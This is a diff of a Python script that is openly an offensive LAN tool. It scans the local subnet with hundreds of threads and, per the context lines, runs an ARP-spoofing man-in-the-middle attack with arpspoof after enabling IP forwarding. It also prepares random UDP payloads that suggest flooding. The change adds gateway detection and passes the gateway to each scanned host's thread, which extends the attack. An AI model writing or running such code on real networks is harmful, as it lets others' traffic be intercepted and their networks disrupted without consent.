@@ -11,6 +11,8 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(2048)
 sent = 0
 
+#need to install "sudo apt install dsniff"
+
 def mitm(victim_ip, gateway_ip):
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     proc = subprocess.Popen(args=["arpspoof", "-i", "eth0", "-t", victim_ip, "-r", gateway_ip], stdout=subprocess.PIPE)
@@ -59,14 +61,16 @@ def ipscanning():
 
     local_ip = s.getsockname()[0]
     build_ip = local_ip.split(".")
+    gatway = f"{build_ip[0]}.{build_ip[1]}.{build_ip[2]}.1"
     builder = f"{build_ip[0]}.{build_ip[1]}.{build_ip[2]}"
-    print(f"[+] Local IP --> {local_ip}")
+    print(f"[+] Local IP --> {local_ip}")    
+    print(f"[+] gatway --> {gatway}")
     print(f"[+] Scanning ip --> {builder}.255\n ")
 
     for class_d in range(1, 255):
         ip = f"{builder}.{class_d}"
         while threading.active_count() > 400:
             pass
-        threading.Thread(target=ip_exist, args=[ip]).start()
+        threading.Thread(target=ip_exist, args=[ip, gatway]).start()
 
 ipscanning()
